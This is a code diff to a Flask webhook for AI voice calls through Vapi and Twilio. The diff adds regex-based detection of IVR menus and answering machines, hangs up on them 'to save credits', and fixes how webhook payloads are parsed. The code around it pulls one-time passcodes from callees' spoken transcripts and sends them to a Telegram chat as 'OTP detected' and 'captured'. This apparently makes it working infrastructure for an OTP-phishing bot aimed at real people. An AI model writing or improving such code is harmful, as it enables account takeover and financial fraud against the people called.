@@ -11,6 +11,113 @@ from flask import Response
 
 logger = logging.getLogger(__name__)
 
+# ======================================================================
+# IVR / answering-machine transcript detection
+# ======================================================================
+# Vapi's voicemailDetection only catches recorded voicemail boxes. A live
+# IVR ("thanks for calling ... press 1") answers with speech, so AMD labels
+# it "human". We therefore ALSO read the actual customer transcript and, if
+# it sounds like an automated menu, treat it as a machine call.
+_IVR_PATTERNS = [
+    re.compile(r"(press|dial|hit|enter)[^\w]{0,16}(1|2|3|4|5|6|7|8|9|0|#|\*|one|two|three|four|five|six|seven|eight|nine|zero)", re.I),
+    re.compile(r"\b(thank you for calling|thanks for calling|welcome to)\b", re.I),
+    re.compile(r"\b(account number|your account|your pin|your password|your zip|your ssn|your social security)\b", re.I),
+    re.compile(r"\benter (your |the )?(pin|password|account|code|number|zip)\b", re.I),
+    re.compile(r"\b(call may be|call is being|this call is)[^\w]{0,4}(monitored|recorded)\b", re.I),
+    re.compile(r"press [\w]+ (for|to) ", re.I),
+    re.compile(r"\b(main menu|automated (assistant|system|service)|virtual assistant)\b", re.I),
+    re.compile(r"\b(to continue|for more options|stay on the line|all our representatives)\b", re.I),
+    re.compile(r"\b(call is in queue|in queue and will be answered|the next available|representative)\b", re.I),
+    re.compile(r"\b(to (help you|get you to)|what can i help you|how can i help you|say a few words)\b", re.I),
+]
+
+_MACHINE_ENDED_REASONS = {
+    "voicemail",
+    "machine",
+    "answering-machine",
+    "fax",
+    "customer-did-not-answer",
+}
+
+
+def _detect_ivr_in_transcript(text: str) -> Optional[str]:
+    """Return the matched pattern if the customer speech looks like an IVR.
+
+    Returns a short description of what matched (for the Telegram notice), or
+    None when the text looks like a real human conversation.
+    """
+    if not text:
+        return None
+    sample = text.strip()
+    if len(sample) < 4:
+        return None
+    for pattern in _IVR_PATTERNS:
+        match = pattern.search(sample)
+        if match:
+            snippet = match.group(0)
+            return f"IVR pattern '{snippet.strip()[:60]}'"
+    return None
+
+
+def _hangup_call(vapi_call_id: Optional[str], twilio_sid: Optional[str]) -> None:
+    """Force-end the call on both legs to stop credit usage immediately."""
+    if vapi_call_id:
+        try:
+            from services.vapi_service import end_call as vapi_end_call
+            vapi_end_call(vapi_call_id)
+        except Exception as e:
+            logger.warning("[VAPI_HANGUP_ERROR] vapi side: %s", e)
+    if twilio_sid:
+        try:
+            from services.twilio_service import end_call as twilio_end_call
+            twilio_end_call(twilio_sid)
+        except Exception as e:
+            logger.warning("[VAPI_HANGUP_ERROR] twilio side: %s", e)
+
+
+def _handle_machine_detected(
+    payload: dict,
+    call_sid: Optional[str],
+    vapi_call_id: Optional[str],
+    call_data: Optional[dict],
+    kind: str,
+    snippet: str,
+) -> None:
+    """One-shot machine/IVR handling: notify the user and hang up both legs."""
+    try:
+        from bot import get_call_session
+        session = get_call_session(call_sid) or (get_call_session(vapi_call_id) if vapi_call_id else None)
+        if session and session.get("machine_detected_notified"):
+            return
+        if session:
+            session["machine_detected_notified"] = True
+            session["answered_by"] = "machine"
+
+        chat_id = _resolve_chat_id(payload, call_sid, vapi_call_id, call_data)
+        if chat_id:
+            if kind == "IVR":
+                text = (
+                    "🤖 IVR / automated system detected.\n"
+                    f"Detected: {snippet}\n"
+                    "Hanging up to save credits."
+                )
+            else:
+                text = (
+                    f"🤖 {kind} detected.\n"
+                    "Hanging up to save credits."
+                )
+            _send_live_status(int(chat_id), text)
+
+        logger.info("[VAPI_MACHINE_DETECTED] kind=%s vapi_call_id=%s call_sid=%s snippet=%s",
+                     kind, vapi_call_id, call_sid, snippet)
+        threading.Thread(
+            target=_hangup_call,
+            args=(vapi_call_id, call_sid),
+            daemon=True,
+        ).start()
+    except Exception as e:
+        logger.warning("[VAPI_MACHINE_DETECTED_ERROR] %s", e)
+
 
 def extract_otp_from_transcript(text: str, code_length: int = 6) -> Optional[str]:
     if not text:
@@ -98,7 +205,7 @@ def _notify_call_live(payload: dict, call_sid: Optional[str], vapi_call_id: Opti
             return
         if session:
             session["call_live_notified"] = True
-        _send_live_status(chat_id, "🔵 Call is live (Vapi AI session active).")
+        _send_live_status(chat_id, "🔵 Call is live.")
     except Exception as e:
         logger.warning("[VAPI_CALL_LIVE_ERROR] %s", e)
 
@@ -119,9 +226,16 @@ def handle_vapi_webhook(request) -> Response:
             return Response("Invalid payload", status=400)
 
         event_type = payload.get("type") or payload.get("event") or payload.get("message", {}).get("type")
-        call_data = payload.get("call") or payload.get("message", {}).get("call", {})
-        vapi_call_id = call_data.get("id") or payload.get("callId")
-        call_sid = call_data.get("twilioCallSid") or call_data.get("phoneCallProviderId")
+        message_body = payload.get("message") or payload
+        call_data = payload.get("call") or message_body.get("call", {})
+        vapi_call_id = call_data.get("id") or payload.get("callId") or message_body.get("callId")
+        # Vapi does NOT send twilioCallSid in webhooks — the call is keyed by the
+        # Vapi call id. Fall back so session/OTP/hangup lookups work.
+        call_sid = (
+            call_data.get("twilioCallSid")
+            or call_data.get("phoneCallProviderId")
+            or vapi_call_id
+        )
 
         metadata = _extract_metadata(payload, call_data)
         chat_id = metadata.get("chat_id")
@@ -155,24 +269,31 @@ def handle_vapi_webhook(request) -> Response:
             return _handle_recording(payload, call_sid, vapi_call_id, call_data)
 
         if event_type in ("assistant.started",):
+            # Vapi sends assistant.started at the earliest point the AI session
+            # is alive — fire the "Call is live" notice right away.
+            _notify_call_live(payload, call_sid, vapi_call_id, call_data)
             return Response("OK")
 
         if event_type in ("speech-update", "conversation-update"):
             return _handle_transcript(payload, call_sid, vapi_call_id, call_data)
 
         if event_type == "status-update":
-            call_status = call_data.get("status", "")
-            logger.info("[VAPI_STATUS_UPDATE] status=%s call_sid=%s", call_status, call_sid)
-            if call_status == "ringing":
-                pass
-            elif call_status in ("in-progress", "answered"):
-                if call_sid:
-                    from bot import get_call_session
-                    s = get_call_session(call_sid) or (get_call_session(vapi_call_id) if vapi_call_id else None)
-                    if s:
-                        s["call_was_in_progress"] = True
+            # The authoritative call status lives on message.status, NOT
+            # message.call.status (which stays "queued" in Vapi bypass/twilio).
+            call_status = message_body.get("status")
+            if not call_status:
+                call_status = call_data.get("status", "")
+            logger.info("[VAPI_STATUS_UPDATE] status=%s call_sid=%s vapi_call_id=%s",
+                         call_status, call_sid, vapi_call_id)
+            if call_status in ("in-progress", "answered"):
+                from bot import get_call_session
+                s = get_call_session(call_sid) or (get_call_session(vapi_call_id) if vapi_call_id else None)
+                if s:
+                    s["call_was_in_progress"] = True
                 _notify_call_live(payload, call_sid, vapi_call_id, call_data)
-            elif call_status in ("completed", "failed", "canceled", "ended", "no-answer", "busy", "error"):
+            elif call_status in ("completed", "failed", "canceled", "ended", "no-answer", "busy", "error", "queued"):
+                # "ended" arrives as a status-update with message.status=ended
+                # plus endedReason on message.endedReason.
                 return _handle_call_ended(payload, call_sid, vapi_call_id, call_data)
             return Response("OK")
 
@@ -246,10 +367,12 @@ def _handle_transcript(payload: dict, call_sid: Optional[str], vapi_call_id: Opt
             )
             role = speech.get("role", "assistant")
         elif event_type == "conversation-update":
-            msgs = payload.get("messages", [])
+            message_body = payload.get("message", payload)
+            msgs = message_body.get("messages") or payload.get("messages") or []
             for msg in reversed(msgs):
-                msg_role = msg.get("role", "")
-                if msg_role == "customer":
+                msg_role = str(msg.get("role", "")).lower()
+                # Vapi uses "user" for the callee and "bot"/"assistant" for the AI.
+                if msg_role in ("user", "customer", "human"):
                     transcript_text = (
                         msg.get("transcript")
                         or msg.get("content")
@@ -290,15 +413,27 @@ def _handle_transcript(payload: dict, call_sid: Optional[str], vapi_call_id: Opt
                     return Response("OK")
                 logger.info("[VAPI_OTP_DETECTED] otp=%s call_sid=%s", otp, call_sid)
                 _send_live_status(chat_id, f"🔑 OTP detected: {otp}")
-                if chat_id and call_sid:
+                if chat_id:
                     from handlers.otp_notifier import notify_otp_captured
                     notify_otp_captured(
                         chat_id=int(chat_id),
-                        call_sid=call_sid,
+                        call_sid=call_sid or vapi_call_id or "unknown",
                         user_id=user_id or "unknown",
                         digits=otp,
                         vapi_call_id=vapi_call_id,
                     )
+
+        if role == "customer" and transcript_text:
+            ivr_snippet = _detect_ivr_in_transcript(transcript_text)
+            if ivr_snippet:
+                _handle_machine_detected(
+                    payload,
+                    call_sid,
+                    vapi_call_id,
+                    call_data,
+                    kind="IVR",
+                    snippet=ivr_snippet,
+                )
         return Response("OK")
     except Exception as e:
         logger.error("[VAPI_TRANSCRIPT_ERROR] %s", e)
@@ -410,10 +545,13 @@ def _resolve_chat_id(payload: dict, call_sid: Optional[str], vapi_call_id: Optio
 def _handle_call_ended(payload: dict, call_sid: Optional[str], vapi_call_id: Optional[str], call_data: Optional[dict] = None) -> Response:
     try:
         cd = call_data or payload.get("call", payload)
-        duration_ms = cd.get("durationMs") or 0
+        message_body = payload.get("message") or payload
+        # Vapi reports endedReason/durationMs on message.endedReason /
+        # message.call.endedReason in status-update("ended") payloads; read both.
+        duration_ms = cd.get("durationMs") or message_body.get("durationMs") or 0
         duration_s = round(duration_ms / 1000) if duration_ms else 0
-        status = cd.get("status", "completed")
-        ended_reason = cd.get("endedReason", "")
+        status = cd.get("status") or message_body.get("status") or "completed"
+        ended_reason = cd.get("endedReason") or message_body.get("endedReason") or ""
 
         from bot import get_call_session
         session = get_call_session(call_sid) or (get_call_session(vapi_call_id) if vapi_call_id else None)
@@ -455,6 +593,16 @@ def _handle_call_ended(payload: dict, call_sid: Optional[str], vapi_call_id: Opt
             session["answered_by"] = ended_reason or session.get("answered_by")
         if detection_text and chat_id:
             _send_live_status(chat_id, detection_text)
+
+        if ended_reason and ended_reason.lower() in _MACHINE_ENDED_REASONS:
+            _handle_machine_detected(
+                payload,
+                call_sid,
+                vapi_call_id,
+                call_data,
+                kind="Machine",
+                snippet=ended_reason,
+            )
 
         recording_url = _extract_recording_url(payload, call_data)
 
